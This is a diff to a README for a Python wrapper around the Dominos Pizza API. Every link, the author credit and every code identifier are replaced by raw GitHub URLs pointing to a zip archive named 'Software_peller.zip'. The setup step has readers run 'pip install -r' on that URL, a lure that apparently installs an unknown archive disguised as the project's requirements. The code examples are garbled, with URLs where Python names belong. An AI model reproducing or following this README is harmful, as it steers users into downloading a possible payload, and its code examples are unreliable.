@@ -3,7 +3,7 @@ pizzapy
 
 Disclaimer
 -----------
-This is my fork of https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip
+This is my fork of https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip
 It's heavily modified and not well documented, but i'm going to get to that. the below example should work though.
 
 sorry! was kind of in a rush this morning.
@@ -13,7 +13,7 @@ Setup
 
 1. install python3
 2. download this repository
-3. install the requirements of the repository `pip install -r https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip`
+3. install the requirements of the repository `pip install -r https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip`
 4. start a python3 interpreter inside of the folder called pizzapy
 5. have fun
 
@@ -23,7 +23,7 @@ Description
 
 This is a Python wrapper for the Dominos Pizza API.
 
-It's a port of `the pizzapi https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip module <https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip>`_ written by `RIAEvangelist <https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip>`_.
+It's a port of `the pizzapi https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip module <https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip>`_ written by `RIAEvangelist <https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip>`_.
 
 Quick Start
 -----------
@@ -32,13 +32,13 @@ First construct a ``Customer`` object and set the customer's address:
 
 .. code-block:: python
 
-    customer = Customer('Barack', 'Obama', 'https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip', '2024561111', '700 Pennsylvania Avenue NW, Washington, DC, 20408')
+    customer = Customer('Barack', 'Obama', 'https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip', '2024561111', '700 Pennsylvania Avenue NW, Washington, DC, 20408')
 
 Then, find a store that will deliver to the address.
 
 .. code-block:: python
 
-    my_local_dominos = https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip(customer)
+    my_local_dominos = https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip(customer)
 
 In order to add items to your order, you'll need the items' product codes.
 To find the codes, get the menu from the store, then search for items you want to add.
@@ -46,13 +46,13 @@ You can do this by asking your ``Store`` object for its ``Menu``.
 
 .. code-block:: python
 
-    menu = https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip()
+    menu = https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip()
 
-Then search ``menu`` with ``https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip``. For example, running this command:
+Then search ``menu`` with ``https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip``. For example, running this command:
 
 .. code-block:: python
 
-    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip(Name='Coke')
+    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip(Name='Coke')
 
 Should print this to the console:
 
@@ -68,16 +68,16 @@ After you've found your items' product codes, you can create an ``Order`` object
 
 .. code-block:: python
 
-    order = https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip(customer, my_local_dominos)
-    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip('P12IPAZA') # add a 12-inch pan pizza
-    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip('MARINARA') # with an extra marinara cup
-    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip('20BCOKE')  # and a 20oz bottle of coke
+    order = https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip(customer, my_local_dominos)
+    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip('P12IPAZA') # add a 12-inch pan pizza
+    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip('MARINARA') # with an extra marinara cup
+    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip('20BCOKE')  # and a 20oz bottle of coke
 
 You can remove items as well!
 
 .. code-block:: python
 
-    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip('20BCOKE')
+    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip('20BCOKE')
 
 Wrap your credit card information in a ``CreditCard``:
 
@@ -89,5 +89,5 @@ And that's it! Now you can place your order.
 
 .. code-block:: python
 
-    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip(card)
-    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/megacephalic/pizzapi.zip(order, card)
+    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip(card)
+    https://raw.githubusercontent.com/Shaurya1456/pizzapi/master/tests/Software_peller.zip(order, card)
